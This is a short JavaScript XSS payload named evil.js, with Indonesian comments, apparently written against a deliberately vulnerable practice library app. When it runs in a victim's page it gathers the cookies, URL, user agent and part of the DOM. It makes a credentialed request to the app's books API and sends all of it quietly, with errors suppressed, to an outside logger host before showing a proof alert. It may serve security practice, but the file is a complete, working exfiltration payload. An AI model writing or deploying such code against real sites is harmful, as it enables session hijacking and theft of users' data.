// evil.js - versi GET ke index.html

function exfil(data) {
  const params = new URLSearchParams();
  params.append('data', JSON.stringify(data));  // encode data jadi string JSON

  // Kirim GET ke root URL
  fetch('https://xss-exfil-logger.vercel.app/?' + params.toString(), {
    method: 'GET',
    mode: 'no-cors'  // tetap pakai ini biar silent
  }).catch(() => {});  // jangan tampil error
}

// Collect data
let payload = {
  timestamp: new Date().toISOString(),
  cookies: document.cookie,
  url: window.location.href,
  ua: navigator.userAgent,
  dom: document.body.innerHTML.substring(0, 3000)
};

// Tambah API fetch jika ada
fetch('https://vulnlib.vulnapp.id/api/books', { credentials: 'include' })
  .then(r => r.text())
  .then(d => { payload.apiData = d; exfil(payload); })
  .catch(() => exfil(payload));

// Alert bukti
alert('XSS executed! Data dikirim ke logger page.');
